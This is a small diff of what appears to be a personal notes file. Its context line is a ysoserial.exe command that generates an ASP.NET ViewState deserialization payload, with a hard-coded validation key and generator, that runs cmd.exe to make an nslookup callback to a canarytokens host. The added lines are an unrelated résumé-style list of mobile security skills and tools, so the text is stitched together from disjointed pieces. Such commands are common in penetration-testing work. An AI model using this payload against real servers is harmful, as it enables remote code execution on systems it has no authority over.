@@ -1,2 +1,9 @@
 ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c nslookup avqv01kzqy3wtw9cicfpyhwqq.canarytokens.com" --generator="6D0E5DFD" --islegacy --validationalg="HMACSHA256" --validationkey="C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE" --isdebug
 
+including 5+ years in Mobile Application Security.
+Strong expertise in Android & iOS Security, OWASP Mobile Top 10, OWASP MASVS, Secure SDLC, Threat Modeling, Secure Code Reviews, and Web/Mobile/API Penetration Testing.
+Hands-on experience with Device Binding, Device Fingerprinting, Device Spoofing, Emulator Detection, Root/Jailbreak Detection, Frida/Xposed, SSL Pinning, Reverse Engineering, RASP, Anti-Tampering, and Anti-Debugging.
+Experience securing UPI, Mobile Wallets, QR Payments, Merchant Payments, and Payment APIs.
+Knowledge of Fraud Prevention including Device Risk Scoring, Behavioral Analytics, Adaptive Authentication, SIM Swap Detection, and Transaction Risk Analysis.
+Strong understanding of Android Keystore, Apple Secure Enclave, Play Integrity API, DeviceCheck, App Attest, Encryption, PKI, and Secure Session Management.
+Hands-on experience with security tools such as Burp Suite, MobSF, Frida, Objection, APKTool, JADX, Ghidra, Wireshark, and Charles Proxy.
